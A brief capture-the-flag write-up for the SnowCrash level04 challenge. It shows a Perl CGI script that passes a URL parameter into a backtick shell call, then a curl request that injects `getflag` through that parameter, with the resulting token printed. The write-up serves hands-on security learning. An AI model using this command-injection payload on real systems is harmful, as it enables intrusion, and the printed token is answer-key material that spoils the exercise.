In home directory there is the Perl script file:
```shell
level04@SnowCrash:~$ ls
level04.pl
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
We see that script must be run on port 4747:
<# localhost:4747>
In function x parametr $y takes only first argument. And we can send path to command getflag with backquotes
`/bin/getflag`. And script will done it with privilege of user flag04.
```shell
level04@SnowCrash:~$ curl 'localhost:4747/?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
